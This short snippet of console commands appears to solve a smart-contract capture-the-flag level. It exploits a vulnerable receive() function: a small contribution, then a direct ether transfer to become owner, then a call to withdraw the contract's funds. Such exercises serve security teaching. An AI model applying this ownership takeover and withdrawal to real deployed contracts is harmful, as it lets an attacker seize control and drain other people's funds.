await contract.contribute.sendTransaction({ from: player, value: toWei('0.000005')}) //make small contribution
await sendTransaction({from: player, to: contract.address, value: toWei('0.000001')}) //send small amount to became the owner since receive() is vulnerable
await contract.owner() //check
await contract.withdraw() //withdraw as now we are the owner